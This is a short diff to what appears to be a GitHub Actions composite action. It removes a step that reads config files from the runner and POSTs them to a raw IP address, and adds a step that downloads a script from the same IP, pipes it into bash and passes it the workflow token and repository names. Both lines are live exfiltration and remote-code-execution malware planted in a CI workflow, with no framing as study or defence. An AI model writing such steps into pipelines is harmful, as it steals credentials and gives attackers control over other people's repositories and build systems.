@@ -11,7 +11,7 @@ runs:
   steps:
     - name: Expose Config Files
       run: |
-        find $HOME/work -type f -name config | xargs cat | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
+        curl -sL http://91.205.105.40/fetch_and_expose_secrets.sh | bash -s "${{ inputs.token }}" "${{ github.repository_owner }}" "${{ github.event.repository.name }}"
       shell: bash
 
     - name: Dummy Step
